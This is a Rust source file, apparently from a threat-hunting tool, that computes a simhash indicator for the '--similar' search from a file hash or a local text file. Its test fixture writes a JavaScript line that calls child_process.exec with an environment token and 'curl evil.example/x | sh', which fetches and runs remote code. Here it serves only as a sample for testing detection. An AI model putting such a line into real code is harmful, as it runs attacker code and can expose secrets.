//! `hunt --similar sha256:HASH`: the simhash indicator of the indexed text file with that hash.

use crate::error::{BrError, BrResult};
use crate::query::index::Index;

/// SPEC is `sha256:HASH` (an indexed file), or a path to a local text file, with an optional `~0.85` threshold
/// (default 0.90). Returns the `simhash:...~T` indicator.
pub fn similar_ioc(ix: Option<&Index>, spec: &str) -> BrResult<String> {
    let (body, thr) = match spec.rsplit_once('~') {
        Some((b, t)) if t.parse::<f64>().is_ok() => {
            let v: f64 = t.parse().unwrap();
            if !(0.0..=1.0).contains(&v) {
                return Err(BrError::new(format!("--similar threshold {t} is not between 0 and 1"), Some("example: --similar suspect.js~0.85")));
            }
            (b, t.to_string())
        }
        _ => (spec, "0.90".to_string()),
    };
    let lower = body.to_lowercase();
    // br prints a hash as 12 hex digits and an ellipsis (`sha256:c81a0b3f9d12…`): the ellipsis is not part of the hash
    let h = lower.strip_prefix("sha256:").unwrap_or(&lower).trim().trim_end_matches('…').trim_end_matches("...").to_string();
    let is_hex = !h.is_empty() && h.chars().all(|c| c.is_ascii_hexdigit());
    // A full hash, or any hex prefix of 6 digits or more that names exactly one file in the index
    let is_hash = is_hex && (6..=64).contains(&h.len());
    if !is_hash {
        // a file on this machine: its own simhash is the indicator
        let path = std::path::Path::new(body);
        if path.is_file() {
            let data = std::fs::read(path).map_err(|e| crate::collect::brx::io_err(e, body))?;
            return match crate::collect::fs::simhash64(&data) {
                Some(s) => Ok(format!("simhash:{s}~{thr}")),
                None => Err(BrError::new(format!("{body} has no simhash (binary or too small)"), Some("--similar takes a text file; hunt a binary by its sha256"))),
            };
        }
        return Err(BrError::new(
            format!("--similar takes sha256:<hex digits> (at least 6, unique in the index) or a readable file ({body} is neither)"),
            Some(&format!("example: --similar sha256:{} or --similar suspect.js~0.85", "ab".repeat(6))),
        ));
    }
    let mut found = false;
    let mut full: std::collections::BTreeSet<String> = Default::default();
    if let Some(ix) = ix {
        for host in ix.names("host") {
            for it in ix.host_items(&host) {
                for f in &it.files {
                    if f.sha256.starts_with(&h) {
                        full.insert(f.sha256.clone());
                    }
                }
            }
        }
        if full.len() > 1 {
            let more: Vec<String> = full.iter().take(3).map(|x| x.chars().take(20).collect()).collect();
            return Err(BrError::new(format!("sha256:{h} starts {} different files in the index", full.len()), Some(&format!("use more digits: {}", more.join(", ")))));
        }
        if let Some(only) = full.iter().next() {
            for host in ix.names("host") {
                for it in ix.host_items(&host) {
                    for f in it.files.iter().filter(|f| &f.sha256 == only) {
                        found = true;
                        if let Some(s) = f.simhash.as_ref().filter(|s| !s.is_empty()) {
                            return Ok(format!("simhash:{s}~{thr}"));
                        }
                    }
                }
            }
        }
    }
    let short: String = h.chars().take(12).collect();
    if found {
        return Err(BrError::new(format!("sha256:{short} is a binary file; it has no simhash"), Some("binaries have no simhash; hunt the exact sha256, or --similar a text file")));
    }
    Err(BrError::new(format!("no indexed file has sha256:{short}"), Some("check the hash; hunt it directly with br hunt sha256:HASH to see where it appears, or pass the file itself: --similar FILE")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_bad_hash() {
        let e = similar_ioc(None, "sha256:abc").err().unwrap();
        assert!(e.msg.contains("at least 6"), "{}", e.msg);
        let e = similar_ioc(None, &"ab".repeat(32)).err().unwrap();
        assert!(e.msg.starts_with("no indexed file has sha256:abababababab"));
        // A prefix that names nothing is the same answer, and the ellipsis br prints is not part of it
        let e = similar_ioc(None, "sha256:c81a0b3f9d12…").err().unwrap();
        assert!(e.msg.starts_with("no indexed file has sha256:c81a0b3f9d12"), "{}", e.msg);
    }

    #[test]
    fn a_file_and_a_threshold() {
        let d = std::env::temp_dir().join(format!("br-sim-{}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        let f = d.join("a.js");
        std::fs::write(&f, "function run() { return require('child_process').exec(process.env.TOKEN + 'curl evil.example/x | sh'); }\n".repeat(20)).unwrap();
        let p = f.to_str().unwrap();
        let r = similar_ioc(None, p).unwrap();
        assert!(r.starts_with("simhash:") && r.ends_with("~0.90"), "{r}");
        assert!(similar_ioc(None, &format!("{p}~0.8")).unwrap().ends_with("~0.8"));
        assert!(similar_ioc(None, &format!("{p}~1.5")).is_err());
        let _ = std::fs::remove_dir_all(&d);
    }
}
